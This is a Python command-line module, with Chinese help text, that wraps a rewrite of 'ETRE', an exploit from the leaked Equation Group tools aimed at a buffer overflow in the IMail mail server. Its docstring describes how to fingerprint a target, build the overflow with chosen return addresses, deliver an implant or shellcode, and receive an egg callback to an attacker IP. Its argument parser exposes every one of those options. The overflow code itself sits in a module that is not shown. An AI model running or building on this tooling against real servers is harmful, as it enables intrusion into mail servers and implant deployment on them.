#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
etre — ETRE 1.0.4 IMAIL mail-server exploit (Equation Group Legacy Windows Exploits).

Python rewrite of `ETRE.exe` recovered from
`EQGRP_Lost_in_Translation-master/windows/Resources/LegacyWindowsExploits/
Exploits/ETRE 1.0.4/ETRE.exe`.

ETRE exploits a buffer overflow in the IMAIL mail server (IMail by Ipswitch)
via its POP / SMTP / HTTP services.  It extends the earlier ETBL (ETCETERABLUE)
tool with:

  - Custom return-address styles ("call esp", "jump esp / push esp; ret")
  - Custom return-address value (generally only for HTTP)
  - Custom alias string
  - IMail version string for target-specific offsets
  - Target install-directory path length

It:
  1. Connects to the target mail service (POP on 110, SMTP on 25, or HTTP),
  2. Performs an optional Touch #1 (banner grab) or Touch #2 (login test),
  3. Builds an overflow buffer with an OS/protocol-specific return address,
  4. Sends the exploit payload carrying an implant or shellcode,
  5. Optionally handles an Egg callback for implant upload.

Recovered strings from the binary:
  - "call esp" / "jump esp / push esp; ret"              — return-address styles
  - "Custom Return Address (generally only for HTTP)"     — custom ret addr
  - "Custom Alias"                                        — custom alias
  - "IMail version"                                       — IMail version
  - "Target's Install directory path length"              — install path len
  - "Touch target #1 - Banner Grab (SMTP, POP, HTTP)"
  - "Touch target #2 - Login Test (POP, HTTP)"
  - "Egg will callback to upload implant code with a new socket."
  - "ETRE"                                                — tool family

CLI mirrors the original argument block:

  etre -i <TargetIp> -p <TargetPort> -r <RunOption> -c <ImplantSocketOption>
       -f <ImplantPayloadFile> [-l <ListeningPostDll>] -t <TargetNetworkProtocol>
       [-u <EggSocketOption>] [-I <EggCallbackIp>] [-P <EggCallbackPort>]
       [-o <Timeout>] [-A <CustomReturnAddress>] [-a <CustomAlias>]
       [-V <IMailVersion>]

run_option: 1 = Touch #1 (banner grab), 2 = Touch #2 (login test), 3 = Exploit
implant_socket_option: 1 = reuse existing socket, 2 = new socket
egg_socket_option: 1 = reuse existing exploit socket, 2 = egg callback
target_network_protocol: 1 = POP, 2 = SMTP, 3 = HTTP
"""

from . import etre_exp


def etre_handle(args):
    """Run the ETRE exploit against the supplied target."""
    return etre_exp.run_function(
        target=args.target,
        port=args.port,
        run_option=args.runoption,
        implant_socket_option=args.implant_socket_option,
        implant_file=args.implant,
        listening_post=args.listening_post,
        protocol=args.protocol,
        egg_socket_option=args.eggsocket,
        egg_callback_ip=args.egg_ip,
        egg_callback_port=args.eggport,
        timeout=args.timeout,
        custom_ret_addr=args.custom_ret_addr,
        custom_alias=args.custom_alias,
        imail_version=args.imail_version,
    )


def reg_subparser(subparsers):
    """Register the `etre` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "etre",
        help="ETRE 1.0.4 IMAIL mail-server 漏洞利用",
        description="ETRE 1.0.4 — Equation Group 针对 IMAIL 邮件服务器的"
                    " POP/SMTP/HTTP 缓冲区溢出漏洞利用工具（ETBL 的后续版本）。"
                    "支持自定义返回地址风格、自定义别名、IMail 版本等选项。",
    )
    p.add_argument(
        "-i", "--target", metavar="IP",
        required=True,
        help="目标主机 IP 地址",
    )
    p.add_argument(
        "-p", "--port", type=int, default=0, metavar="PORT",
        help="目标端口（0 = 根据协议自动：POP 110 / SMTP 25 / HTTP 80）",
    )
    p.add_argument(
        "-r", "--runoption", type=int, choices=[1, 2, 3], default=3, metavar="OPT",
        help="运行选项：1=Touch #1 (横幅抓取)，2=Touch #2 (登录测试)，3=Exploit (默认 3)",
    )
    p.add_argument(
        "-c", "--implant-socket-option", type=int, choices=[1, 2], default=1, metavar="OPT",
        help="惯例套接字选项：1=复用现有利用套接字，2=新建套接字 (默认 1)",
    )
    p.add_argument(
        "-f", "--implant", metavar="FILE",
        help="植入负载文件路径",
    )
    p.add_argument(
        "-l", "--listening-post", metavar="DLL",
        help="监听站 DLL 路径",
    )
    p.add_argument(
        "-t", "--protocol", type=int, choices=[1, 2, 3], default=1, metavar="PROTO",
        help="目标网络协议：1=POP，2=SMTP，3=HTTP (默认 1)",
    )
    p.add_argument(
        "-u", "--eggsocket", type=int, choices=[1, 2], default=1, metavar="OPT",
        help="Egg 套接字选项：1=复用现有利用套接字，2=Egg 回连 (默认 1)",
    )
    p.add_argument(
        "-I", "--egg-ip", metavar="IP",
        help="Egg Callback 回连 IP 地址",
    )
    p.add_argument(
        "-P", "--eggport", type=int, default=0, metavar="PORT",
        help="Egg Callback 端口",
    )
    p.add_argument(
        "-o", "--timeout", type=int, default=30, metavar="SEC",
        help="等待回复的秒数 (默认 30)",
    )
    p.add_argument(
        "-A", "--custom-ret-addr", metavar="ADDR",
        help="自定义返回地址（如 call esp / 0xdeadbeef，一般仅 HTTP 模式需要）",
    )
    p.add_argument(
        "-a", "--custom-alias", metavar="ALIAS",
        help="自定义别名字符串",
    )
    p.add_argument(
        "-V", "--imail-version", metavar="VER",
        help="IMail 版本字符串（用于选择目标特定偏移）",
    )
    p.set_defaults(func=etre_handle)
